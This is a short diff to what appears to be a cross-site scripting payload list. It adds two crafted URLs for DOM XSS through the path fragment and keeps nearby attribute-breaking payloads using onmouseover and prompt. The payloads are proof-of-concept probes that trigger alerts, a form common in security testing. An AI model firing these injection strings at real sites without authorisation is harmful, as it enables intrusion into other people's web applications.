@@ -27,6 +27,11 @@ n'onmouseover='prompt(-12)
 
 =============================== Frequently used Payloads end ===============================
 
+=========================== DOM XSS through path fragment start ============================
+https://www.target.com/'-alert(origin)-'
+https://www.target.com/login.html?#a"-alert(origin)-"
+===========================  DOM XSS through path fragment end  ============================
+
 ===============================    URL INPUT FIELDS START    ===============================
 
 https://google.com"onmouseover="prompt(1)
